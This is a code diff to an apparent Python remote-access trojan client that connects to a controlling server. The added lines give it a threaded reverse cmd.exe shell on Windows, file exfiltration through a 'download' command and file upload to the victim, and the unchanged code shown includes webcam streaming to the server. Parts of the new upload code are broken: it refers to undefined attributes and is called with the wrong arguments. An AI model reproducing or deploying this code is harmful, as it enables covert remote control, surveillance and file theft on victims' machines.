@@ -9,9 +9,38 @@ import struct
 import imutils
 import platform
 import time
+import threading
 
 # Supposed to be a stable bash shell, works
 # on the client but not on the server
+
+def s2p(s, p):
+    while True:
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+            p.stdin.flush()
+
+def p2s(s, p):
+    while True:
+        s.send(p.stdout.read(1))
+
+def windows_shell(s):
+
+	p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+	s2p_thread = threading.Thread(target=s2p, args=[s, p])
+	s2p_thread.daemon = True
+	s2p_thread.start()
+
+	p2s_thread = threading.Thread(target=p2s, args=[s, p])
+	p2s_thread.daemon = True
+	p2s_thread.start()
+
+	try:
+		p.wait()
+	except KeyboardInterrupt:
+		s.close()
 
 def spawn_shell(s):
 	stdin = os.dup(0)
@@ -30,7 +59,7 @@ def spawn_shell(s):
 		os.close(stdout)
 		os.close(stderr)
 	elif platform.system() == 'Windows':
-		subprocess.run(["cmd.exe"])
+		windows_shell(s)
 
 # Capture video with webcam
 
@@ -47,22 +76,34 @@ class VideoStream:
 			self.s.sendall(message)
 
 class FileTransfer:
-	def __init__(self, s, file):
+	def __init__(self, s):
 		self.s = s
-		self.file = file
 
-	def send(self):
+	def send(self, file):
 		try:
-			file_size = os.stat(self.file).st_size
+			file_size = os.stat(file).st_size
 		except FileNotFoundError:
 			self.s.send('0'.encode())
 			return
 		self.s.send((str(file_size) + '\n').encode())
-		with open(self.file, 'r') as f:
+		with open(file, 'r') as f:
 			while file_size > 0:
 				data = f.readline()
 				file_size -= len(data)
 				self.s.send(data.encode())
+
+	def receive(self, file, recv_path):
+		splitted = self.client_socket.recv(BUFFER_SIZE).decode().split('\n', 1)
+		file_size = int(splitted[0])
+		if file_size == 0:
+			print(f"Could not open {file}")
+			return
+		data = splitted[1]
+		with open(recv_path, 'w') as f:
+			while file_size > 0:
+				data = self.client_socket.recv(BUFFER_SIZE).decode()
+				file_size -= len(data)
+				f.write(data)
 
 
 def main(SERVER_HOST, SERVER_PORT):
@@ -89,8 +130,12 @@ def main(SERVER_HOST, SERVER_PORT):
 			stream.send()
 		elif splitted_command[0] == "download":
 			file = splitted_command[1]
-			transfer = FileTransfer(s, file)
-			transfer.send()
+			transfer = FileTransfer(s)
+			transfer.send(file)
+		elif splitted_command[0] == "upload":
+			path = splitted_command[1]
+			transfer = FileTransfer(s)
+			transfer.receive(path)
 		elif command == "shell":
 			spawn_shell(s)
 		else:
